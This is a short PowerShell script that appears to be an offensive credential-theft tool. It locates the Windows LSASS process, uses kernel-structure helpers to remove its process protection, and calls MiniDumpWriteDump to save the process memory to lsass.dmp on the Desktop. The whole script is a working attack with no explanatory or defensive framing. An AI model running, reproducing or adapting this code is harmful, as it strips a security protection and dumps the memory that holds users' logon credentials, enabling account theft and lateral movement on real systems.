Import-Module NativeInteropLib -ErrorAction Stop

Clear-Host
Write-Host

if (-not $Proc) {
    $Proc     = [System.Diagnostics.Process]::GetProcessesByName("lsass")[0]
    $Size     = $Proc.Modules | ? FileName -Match lsasrv.dll | select -ExpandProperty Size
    $ProcId   = $Proc.Id
    $hProcess = $Proc.Handle
}

$eProc = Query-EprocessStruct -ProcessID $ProcId
Update-ProcessProtection -Eprocess $eProc -SignerValue None -TypeValue None | Out-Null

Set-Location ([Environment]::GetFolderPath("Desktop"))
$fs = [System.IO.File]::Create("$PWD\lsass.dmp")

try {
    $Values = $hProcess, $ProcId, ($fs.SafeFileHandle.DangerousGetHandle()), [int32]2, 0L, 0L, 0L
    Invoke-UnmanagedMethod -Dll dbgcore.dll -Function MiniDumpWriteDump -Values $Values -Return bool
}
finally {
    if ($fs) { $fs.Close() }
}